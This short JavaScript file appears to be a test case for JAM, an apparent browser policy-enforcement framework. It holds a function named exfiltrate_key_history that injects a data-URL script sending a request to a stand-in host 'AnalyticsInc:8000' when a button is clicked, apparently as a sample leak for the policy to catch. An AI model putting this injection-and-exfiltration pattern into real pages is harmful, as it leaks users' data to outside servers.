
JAM.startProfile('load');
function exfiltrate_key_history(){var data='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=data1", true);xmlhttp.send(null);',URL="data:text/javascript;,"+encodeURIComponent(data),data=document.createElement("script");data.src=URL;URL=document.getElementsByTagName("head");introspect(JAM.policy.p1)URL=URL[0];JAM.call(URL.appendChild,URL,[data])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)

JAM.stopProfile('load');
